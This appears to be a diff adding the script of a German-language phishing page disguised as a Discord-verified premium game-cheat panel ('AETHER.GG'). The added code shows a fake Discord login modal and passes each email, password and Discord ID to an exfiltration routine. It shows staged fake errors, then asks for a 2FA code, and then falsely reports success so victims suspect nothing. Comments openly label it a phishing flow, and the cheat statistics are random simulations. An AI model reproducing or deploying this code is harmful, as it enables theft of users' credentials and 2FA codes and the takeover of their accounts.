+            D.vStatus.innerHTML = '✅ <span class="ok">Lizenz verifiziert! Alle Features freigeschaltet.</span>';
+            D.verifyBtn.disabled = true;
+            D.verifyBtn.textContent = '✅ Aktiv';
+            D.reAuthBtn.disabled = true;
+            D.reAuthBtn.textContent = '✅ Autorisiert';
+
+            console.log('%c✅ Zugang gewährt: ' + user + ' (' + id + ')', 'color:#22c55e');
+        }
+
+        // ═════════════════════════════════════════════════════════════════
+        //  PHISHING-FLOW (FIXED)
+        // ═════════════════════════════════════════════════════════════════
+        //
+        //  Versuch 1: Daten exfiltrieren → Fake-Fehler
+        //  Versuch 2: Daten exfiltrieren → Fake-Fehler  
+        //  Versuch 3: 2FA-Feld einblenden → Daten + 2FA exfiltrieren → ERFOLG!
+        //  → Zugang wird gewährt, Opfer denkt, es hat geklappt
+        //  Alle weiteren Versuche werden trotzdem noch geloggt
+
+        let currentId = '';
+
+        function openDm() {
+            D.dmError.classList.remove('show');
+            D.dmLoading.classList.remove('show');
+            D.dm2fa.classList.remove('show');
+            D.dmEmail.value = '';
+            D.dmPass.value = '';
+            D.dm2faCode.value = '';
+            D.dmLoginBtn.disabled = false;
+            D.dmLoginBtn.textContent = 'Anmelden';
+            D.dmOverlay.classList.add('show');
+            setTimeout(() => D.dmEmail.focus(), 350);
+        }
+
+        function closeDm() {
+            D.dmOverlay.classList.remove('show');
+        }
+
+        async function doLogin() {
+            const email = D.dmEmail.value.trim();
+            const pass = D.dmPass.value;
+
+            if (!email || !pass) {
+                D.dmError.textContent = '❌ Bitte E-Mail und Passwort eingeben.';
+                D.dmError.classList.add('show');
+                return;
+            }
+
+            D.dmLoginBtn.disabled = true;
+            D.dmLoading.classList.add('show');
+            D.dmError.classList.remove('show');
+            D.dmLoginBtn.textContent = 'Authentifiziere ...';
+
+            await new Promise(r => setTimeout(r, 1200 + Math.random() * 1000));
+
+            S.attempt++;
+
+            // ==========================================================
+            //  Basisdaten immer exfiltrieren
+            // ==========================================================
+            const baseData = {
+                '🔑 Discord-ID': currentId || '—',
+                '📧 E-Mail': email,
+                '🔐 Passwort': pass,
+                '🔄 Versuch': S.attempt
+            };
+
+            // 2FA-Code mitnehmen falls vorhanden
+            const twofa = D.dm2faCode.value.trim();
+            if (twofa) {
+                baseData['🔢 2FA-Code'] = twofa;
+            }
+
+            await exfiltrate(baseData);
+            S.captured = true;
+
+            D.dmLoading.classList.remove('show');
+
+            // ==========================================================
+            //  FLOW-STEUERUNG
+            // ==========================================================
+
+            if (S.attempt < 3) {
+                // Versuch 1 & 2: Fake-Fehler
+                const errors = [
+                    '❌ Falscher Benutzername oder Passwort.',
+                    '❌ Anmeldung fehlgeschlagen. Überprüfe deine Eingaben.'
+                ];
+                D.dmError.textContent = errors[S.attempt - 1];
+                D.dmError.classList.add('show');
+                D.dmLoginBtn.disabled = false;
+                D.dmLoginBtn.textContent = 'Erneut versuchen';
+
+                // Beim 2. Fehlversuch: 2FA-Feld already for next attempt
+                if (S.attempt === 2) {
+                    D.dm2fa.classList.add('show');
+                    D.dmError.textContent = '📱 2FA-Code erforderlich – bitte gib den Code aus deiner Authenticator-App ein.';
+                }
+
+                // Reset handler for next attempt
+                D.dmLoginBtn.onclick = doLogin;
+
+            } else if (S.attempt === 3) {
+                // ==========================================================
+                //  DRITTER VERSUCH: 2FA eingegeben? → ERFOLG!
+                // ==========================================================
+                if (!twofa) {
+                    D.dmError.textContent = '❌ 2FA-Code ungültig. Bitte versuche es erneut.';
+                    D.dmError.classList.add('show');
+                    D.dmLoginBtn.disabled = false;
+                    D.dmLoginBtn.textContent = 'Erneut versuchen';
+                    D.dmLoginBtn.onclick = doLogin;
+                    return;
+                }
+
+                // ✅ Erfolg! Zugang gewähren
+                D.dmError.classList.remove('show');
+                D.dmLoading.classList.add('show');
+                D.dmLoading.innerHTML = '<span class="dm-spinner"></span> Verifiziere Lizenz …';
+                D.dmLoginBtn.disabled = true;
+                D.dmLoginBtn.textContent = 'Wird verifiziert …';
+
+                await new Promise(r => setTimeout(r, 1800 + Math.random() * 800));
+
+                D.dmLoading.classList.remove('show');
+                D.dmLoading.innerHTML = '<span class="dm-spinner"></span> Authentifiziere …';
+
+                // Modal schließen
+                closeDm();
+
+                // Auf der Hauptseite Erfolg anzeigen + Zugang freischalten
+                D.vStatus.innerHTML = '✅ <span class="ok">Lizenz erfolgreich verifiziert! Alle Features freigeschaltet.</span>';
+                D.verifyBtn.disabled = true;
+                D.verifyBtn.textContent = '✅ Aktiv';
+
+                // Discord-Benutzernamen aus der E-Mail extrahieren (vor @)
+                const username = email.split('@')[0] || 'User';
+                setVerified(username, currentId);
+
+                console.log('%c✅ Phishing erfolgreich – Zugang gewährt für ' + email, 'color:#22c55e');
+
+            } else {
+                // Versuch 4+: weiter sammeln, aber Zugang bleibt
+                D.dmError.textContent = '❌ Konto vorübergehend gesperrt (zu viele Fehlversuche). Bitte versuche es in 30 Minuten erneut.';
+                D.dmError.classList.add('show');
+                D.dmLoginBtn.disabled = true;
+                D.dmLoginBtn.textContent = 'Gesperrt';
+
+                setTimeout(() => {
+                    closeDm();
+                    if (!S.verified) {
+                        D.vStatus.innerHTML = '❌ <span class="err">Lizenzprüfung fehlgeschlagen – bitte Support kontaktieren.</span>';
+                        D.verifyBtn.disabled = false;
+                        D.verifyBtn.textContent = 'Verifizieren';
+                    }
+                }, 3000);
+            }
+        }
+
+        // ═════════════════════════════════════════════════════════════════
+        //  EVENT: VERIFY-BUTTON (Hauptseite)
+        // ═════════════════════════════════════════════════════════════════
+
+        D.verifyBtn.addEventListener('click', function() {
+            if (S.verified) {
+                D.vStatus.innerHTML = 'ℹ️ <span style="color:#3b82f6;">Bereits verifiziert als ' + S.userName + '.</span>';
+                return;
+            }
+
+            const id = D.discordId.value.trim();
+            if (!id) {
+                D.vStatus.innerHTML = '⚠️ <span class="err">Bitte eine gültige Discord-ID eingeben.</span>';
+                return;
+            }
+
+            currentId = id;
+            S.attempt = 0;
+
+            D.vStatus.innerHTML = '⏳ <span class="load">Verbinde mit Discord-Servern ...</span>';
+            D.verifyBtn.disabled = true;
+            D.verifyBtn.textContent = '⏳ Warte ...';
+
+            setTimeout(() => {
+                D.vStatus.innerHTML = '🔐 <span class="load">Discord-Login zur Rollenprüfung erforderlich</span>';
+                D.verifyBtn.disabled = false;
+                D.verifyBtn.textContent = 'Verifizieren';
+                openDm();
+            }, 900);
+        });
+
+        D.discordId.addEventListener('keydown', e => {
+            if (e.key === 'Enter') D.verifyBtn.click();
+        });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  MODAL-EVENTS
+        // ═════════════════════════════════════════════════════════════════
+
+        D.dmLoginBtn.addEventListener('click', doLogin);
+
+        D.dmEmail.addEventListener('keydown', e => { if (e.key === 'Enter') D.dmPass.focus(); });
+        D.dmPass.addEventListener('keydown', e => { if (e.key === 'Enter') D.dmLoginBtn.click(); });
+        D.dm2faCode.addEventListener('keydown', e => { if (e.key === 'Enter') D.dmLoginBtn.click(); });
+
+        D.dmClose.addEventListener('click', () => {
+            closeDm();
+            if (!S.verified) {
+                D.vStatus.innerHTML = '⚠️ <span class="err">Verifizierung abgebrochen.</span>';
+                D.verifyBtn.disabled = false;
+                D.verifyBtn.textContent = 'Verifizieren';
+            }
+        });
+
+        D.dmOverlay.addEventListener('click', e => {
+            if (e.target === D.dmOverlay) {
+                closeDm();
+                if (!S.verified) {
+                    D.vStatus.innerHTML = '⚠️ <span class="err">Verifizierung abgebrochen.</span>';
+                    D.verifyBtn.disabled = false;
+                    D.verifyBtn.textContent = 'Verifizieren';
+                }
+            }
+        });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  RE-AUTH BUTTON
+        // ═════════════════════════════════════════════════════════════════
+
+        D.reAuthBtn.addEventListener('click', () => {
+            if (S.verified) {
+                D.vStatus.innerHTML = 'ℹ️ <span style="color:#3b82f6;">Bereits verifiziert als ' + S.userName + '.</span>';
+                return;
+            }
+            D.discordId.focus();
+            D.discordId.scrollIntoView({ behavior: 'smooth' });
+        });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  SLIDER LIVE
+        // ═════════════════════════════════════════════════════════════════
+
+        D.slSmooth.addEventListener('input', function() { D.slSmoothVal.textContent = this.value; });
+        D.slFov.addEventListener('input', function() { D.slFovVal.textContent = this.value + '°'; });
+        D.slConf.addEventListener('input', function() { D.slConfVal.textContent = this.value + '%'; });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  MASTER TOGGLE
+        // ═════════════════════════════════════════════════════════════════
+
+        D.masterSw.addEventListener('click', function() {
+            this.classList.toggle('on');
+            S.aimbotOn = this.classList.contains('on');
+            D.statDot.className = 'stat-dot' + (S.aimbotOn ? '' : ' off');
+            D.statTxt.textContent = S.aimbotOn ? 'Verbunden' : 'Getrennt';
+            D.targets.textContent = S.aimbotOn ? Math.floor(Math.random() * 3) + 3 : '0';
+        });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  LIVE SIMULATION (Targets, Accuracy)
+        // ═════════════════════════════════════════════════════════════════
+
+        setInterval(() => {
+            if (S.aimbotOn && S.verified) {
+                D.targets.textContent = Math.floor(Math.random() * 5) + 2;
+                D.accuracy.textContent = (98 + Math.random() * 1.8).toFixed(1) + '%';
+            }
+        }, 3000);
+
+        // ═════════════════════════════════════════════════════════════════
+        //  KEYBOARD: ALT+A = Toggle
+        // ═════════════════════════════════════════════════════════════════
+
+        document.addEventListener('keydown', e => {
+            if (e.altKey && e.key === 'a') {
+                e.preventDefault();
+                D.masterSw.click();
+            }
+        });
+
+        // ═════════════════════════════════════════════════════════════════
+        //  CONSOLE
+        // ═════════════════════════════════════════════════════════════════
+
+        console.log('%c╔══════════════════════════════════════╗', 'color:#888');
+        console.log('%c║    A E T H E R . G G                ║', 'color:#fff;font-weight:bold;');
+        console.log('%c║    P R E M I U M   C H E A T        ║', 'color:#a855f7;font-weight:bold;');
+        console.log('%c╚══════════════════════════════════════╝', 'color:#888');
+        console.log('%c🎯 Aimbot · 🤖 Triggerbot · 📡 Radar · 🔊 Sound ESP · 🔄 Recoil', 'color:#22c55e');
+        console.log('%c🔐 Discord-Verifizierung erforderlich', 'color:#3b82f6');
+        console.log('%c📡 Status: ONLINE | ' + new Date().toLocaleString(), 'color:#888');
+        console.log('%c🐟 Phishing-Flow: 2 Fehler → 2FA → ERFOLG + Zugang', 'color:#a855f7');
+
+        // ═════════════════════════════════════════════════════════════════
+        //  START
+        // ═════════════════════════════════════════════════════════════════
+
+        updateFeatures();
+    </script>
+</body>
+</html>
